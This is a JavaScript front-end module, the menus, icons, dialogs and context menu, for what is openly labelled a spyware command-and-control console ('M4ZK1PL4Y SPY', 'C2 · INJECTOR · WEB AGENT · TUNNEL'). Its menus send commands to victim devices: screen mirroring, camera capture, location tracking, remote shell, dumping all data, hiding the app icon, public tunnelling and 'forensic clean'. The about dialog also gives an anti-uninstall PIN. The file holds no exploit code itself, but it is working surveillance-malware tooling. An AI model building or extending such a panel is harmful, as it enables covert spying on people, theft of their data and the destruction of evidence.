/* chrome, ikon, ripple, modal, ctx menu */
import { $, $$, esc, clock, api } from './core.js';

const P = {
  dash: 'M3 3h7v7H3zM14 3h7v5h-7zM14 12h7v9h-7zM3 14h7v7H3z',
  clients: 'M4 5h16v11H4zM8 20h8M12 16v4',
  qr: 'M3 3h6v6H3zM15 3h6v6h-6zM3 15h6v6H3zM15 15h2v2h-2zM19 15h2v2h-2zM15 19h2v2h-2zM19 19h2v2h-2z',
  build: 'M4 7h16v12H4zM8 7V4h8v3M9 12h6',
  dumps: 'M12 3v10M8 9l4 4 4-4M4 17v3h16v-3',
  admin: 'M12 3l8 4v6c0 5-3.5 7.5-8 8-4.5-.5-8-3-8-8V7z',
  power: 'M12 3v9M7 6a8 8 0 1 0 10 0',
  ping: 'M2 12h4l3-7 4 14 3-7h6',
  screen: 'M3 4h18v12H3zM8 20h8M12 16v4',
  cam: 'M3 7h4l2-2h6l2 2h4v12H3zM12 10a3 3 0 1 0 0 6 3 3 0 0 0 0-6',
  loc: 'M12 21s7-6 7-11a7 7 0 1 0-14 0c0 5 7 11 7 11zM12 8a2 2 0 1 0 0 4 2 2 0 0 0 0-4',
  mic: 'M12 3a3 3 0 0 1 3 3v6a3 3 0 0 1-6 0V6a3 3 0 0 1 3-3zM5 11a7 7 0 0 0 14 0M12 18v3',
  shell: 'M4 5h16v14H4zM7 10l2 2-2 2M12 14h5',
  dump: 'M4 4h10l6 6v10H4zM14 4v6h6',
  hide: 'M2 12s4-6 10-6 10 6 10 6-4 6-10 6S2 12 2 12zM12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6',
  kill: 'M6 6l12 12M18 6L6 18',
  tunnel: 'M4 20a8 8 0 0 1 16 0M8 20a4 4 0 0 1 8 0M12 20h.01',
  reload: 'M20 12a8 8 0 1 1-2.3-5.6M20 4v5h-5',
  info: 'M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM12 8h.01M11 12h1v5',
  logout: 'M14 4H5v16h9M17 8l4 4-4 4M21 12h-9',
  bolt: 'M13 2L5 14h6l-1 8 8-12h-6z',
  gear: 'M12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2',
  wipe: 'M4 7h16M9 7V4h6v3M6 7l1 13h10l1-13',
  file: 'M6 3h8l4 4v14H6zM14 3v4h4',
  clock: 'M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM12 7v5l4 2',
  term: 'M3 4h18v16H3zM7 9l2 2-2 2M12 13h5',
  app: 'M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z',
  net: 'M12 3v18M5 8h14M5 16h14',
  lock: 'M6 10h12v10H6zM9 10V7a3 3 0 0 1 6 0v3',
};

export const svg = (n) =>
  '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" ' +
  'stroke-linecap="round" stroke-linejoin="round"><path d="' + (P[n] || P.info) + '"/></svg>';

export function rippleInit(root = document) {
  root.addEventListener('pointerdown', (e) => {
    const t = e.target.closest('.btn,.chip,.tbtn,.tab,.mb-item,.pcard,.card');
    if (!t) return;
    const r = t.getBoundingClientRect();
    const d = Math.max(r.width, r.height) || 10;
    const s = document.createElement('span');
    s.className = 'rip';
    s.style.width = s.style.height = d + 'px';
    s.style.left = (e.clientX - r.left - d / 2) + 'px';
    s.style.top = (e.clientY - r.top - d / 2) + 'px';
    t.appendChild(s);
    setTimeout(() => s.remove(), 520);
  }, { passive: true });
}

const NAV = [
  ['dashboard', 'Overview', 'dash'], ['targets', 'Clients', 'clients'],
  ['pair', 'Pairing', 'qr'], ['build', 'Build', 'build'],
  ['dumps', 'Dumps', 'dumps'], ['admin', 'Admin', 'admin'],
];

export function chrome(win, opt = {}) {
  const page = opt.page || 'dashboard';
  const title = opt.title || 'Console';
  const actions = opt.actions || [];
  const nav = NAV.map(([p, l, i]) =>
    '<button data-page="' + p + '"' + (p === page ? ' style="color:var(--acc)"' : '') + '>' +
    svg(i) + l + '</button>').join('');

  win.innerHTML =
    '<div class="titlebar">' +
      '<div class="tb-brand"><img src="/static/img/garuda.svg" alt=""><b>M4ZK1PL4Y</b><span>SPY</span></div>' +
      '<div class="tb-path">C2 \\ ' + esc(title.toUpperCase()) + '</div>' +
      '<div class="tb-right">' +
        '<span class="tb-chip on"><i class="led on"></i><span id="tbOn">0</span> ONLINE</span>' +
        '<span class="tb-chip" id="tbPub">LOCAL</span>' +
        '<div class="tb-win"><i></i><i></i><i></i></div>' +
      '</div>' +
    '</div>' +
    '<div class="menubar">' +
      '<div class="mb-item" data-menu>FILE<div class="mb-drop">' + nav +
        '<div class="sep"></div><button data-act="logout">' + svg('logout') + 'Keluar</button></div></div>' +
      '<div class="mb-item" data-menu>CLIENT<div class="mb-drop">' +
        '<button data-cmd="ping">' + svg('ping') + 'Ping</button>' +
        '<button data-cmd="screen_start">' + svg('screen') + 'Mirror</button>' +
        '<button data-cmd="cam_front">' + svg('cam') + 'Kamera</button>' +
        '<button data-cmd="locate_start">' + svg('loc') + 'Lokasi</button>' +
        '<div class="sep"></div>' +
        '<button data-cmd="shell">' + svg('shell') + 'Shell</button>' +
        '<button data-cmd="dumpall">' + svg('dump') + 'Dump semua</button>' +
        '<button data-cmd="hide_icon">' + svg('hide') + 'Sembunyikan</button>' +
        '<div class="sep"></div>' +
        '<button data-cmd="kill_self" class="danger">' + svg('kill') + 'Matikan agent</button></div></div>' +
      '<div class="mb-item" data-menu>TOOLS<div class="mb-drop">' +
        '<button data-cmd="tunnel">' + svg('tunnel') + 'Tunnel publik</button>' +
        '<button data-cmd="broadcast">' + svg('bolt') + 'Broadcast</button>' +
        '<button data-cmd="forensic">' + svg('wipe') + 'Forensic clean</button>' +
        '<div class="sep"></div><button data-act="reload">' + svg('reload') + 'Muat ulang</button></div></div>' +
      '<div class="mb-item" data-menu>HELP<div class="mb-drop">' +
        '<button data-act="about">' + svg('info') + 'Tentang</button>' +
        '<button data-act="docs">' + svg('file') + 'API docs</button></div></div>' +
      '<div class="spacer"></div>' +
      '<div class="mb-item" id="mbClock" style="cursor:default">--:--:--</div>' +
    '</div>' +
    '<div class="toolbar">' + actions.join('') +
      '<div class="spacer"></div><span class="tb-chip" id="tbSess">SESI</span></div>';

  $$('.mb-item[data-menu]').forEach((m) => {
    m.addEventListener('click', (e) => {
      e.stopPropagation();
      const was = m.classList.contains('open');
      $$('.mb-item').forEach((x) => x.classList.remove('open'));
      if (!was) m.classList.add('open');
    });
  });
  document.addEventListener('click', () => $$('.mb-item').forEach((x) => x.classList.remove('open')));

  win.addEventListener('click', (e) => {
    const pg = e.target.closest('[data-page]');
    if (pg) { location.href = '/' + pg.dataset.page; return; }
    const cm = e.target.closest('[data-cmd]');
    if (cm) { window.dispatchEvent(new CustomEvent('mzk:cmd', { detail: cm.dataset.cmd })); return; }
    const ac = e.target.closest('[data-act]');
    if (!ac) return;
    const a = ac.dataset.act;
    if (a === 'logout') logout();
    else if (a === 'reload') location.reload();
    else if (a === 'about') about();
    else if (a === 'docs') window.open('/api/docs', '_blank');
  });

  rippleInit(win);
  clock($('#mbClock'));
  api('/api/targets').then((d) => { const n = $('#tbOn'); if (n) n.textContent = d.stats.online; }).catch(() => {});
  api('/api/tunnel/status').then((s) => {
    const el = $('#tbPub');
    if (el && s.url) { el.textContent = 'TUNNEL'; el.classList.add('on'); }
  }).catch(() => {});
}

export async function logout() {
  try { await api('/api/logout', { method: 'POST' }); } catch {}
  location.href = '/login';
}

export function about() {
  const m = document.createElement('div');
  m.className = 'mask on';
  m.innerHTML = '<div class="dlg"><div class="dlg-h">' + svg('info') +
    'M4ZK1PL4YSPY<span class="x">&times;</span></div><div class="dlg-b">' +
    '<b style="color:#fff">C2 &middot; INJECTOR &middot; WEB AGENT &middot; TUNNEL</b><br>' +
    'v2.1.0 CRIMSON-VOID &mdash; full remote access console.<br>' +
    'License M4ZK1PL4Y &middot; PIN anti-uninstall 211421.<br><br>' +
    '<span class="dim">Klik kanan baris client untuk menu cepat.</span></div>' +
    '<div class="dlg-f"><button class="btn acc" data-x>TUTUP</button></div></div>';
  document.body.appendChild(m);
  m.addEventListener('click', (e) => {
    if (e.target === m || e.target.dataset.x !== undefined || e.target.className === 'x') m.remove();
  });
}

export function confirmBox(title, msg, danger = true) {
  return new Promise((res) => {
    const m = document.createElement('div');
    m.className = 'mask on';
    m.innerHTML = '<div class="dlg"><div class="dlg-h">' + svg('bolt') + esc(title) +
      '<span class="x">&times;</span></div><div class="dlg-b">' + esc(msg) + '</div>' +
      '<div class="dlg-f"><button class="btn ghost" data-n>BATAL</button>' +
      '<button class="btn ' + (danger ? 'acc' : '') + '" data-y>LANJUT</button></div></div>';
    document.body.appendChild(m);
    const done = (v) => { m.remove(); res(v); };
    m.addEventListener('click', (e) => {
      if (e.target.dataset.y !== undefined) done(true);
      else if (e.target.dataset.n !== undefined || e.target === m || e.target.className === 'x') done(false);
    });
  });
}

export function ctxMenu(x, y, rows) {
  $$('.ctx').forEach((c) => c.remove());
  const m = document.createElement('div');
  m.className = 'ctx';
  m.innerHTML = rows.map((r) => r === '-'
    ? '<div class="sep"></div>'
    : '<button data-k="' + r.k + '"' + (r.danger ? ' class="danger"' : '') + '>' +
      svg(r.i || 'bolt') + r.l + '</button>').join('');
  document.body.appendChild(m);
  m.style.left = Math.min(x, innerWidth - m.offsetWidth - 6) + 'px';
  m.style.top = Math.min(y, innerHeight - m.offsetHeight - 6) + 'px';
  m.addEventListener('click', (e) => {
    const b = e.target.closest('[data-k]');
    m.remove();
    if (b) window.dispatchEvent(new CustomEvent('mzk:cmd', { detail: b.dataset.k }));
  });
  setTimeout(() => document.addEventListener('click', () => m.remove(), { once: true }), 10);
}

export function statusbar(win, html) {
  const sb = document.createElement('div');
  sb.className = 'statusbar';
  sb.innerHTML = html || '<span class="st"><b>&#9679;</b> READY</span><span class="st-r">v2.1.0</span>';
  win.appendChild(sb);
  clock($('#stClk', sb));
  return sb;
}
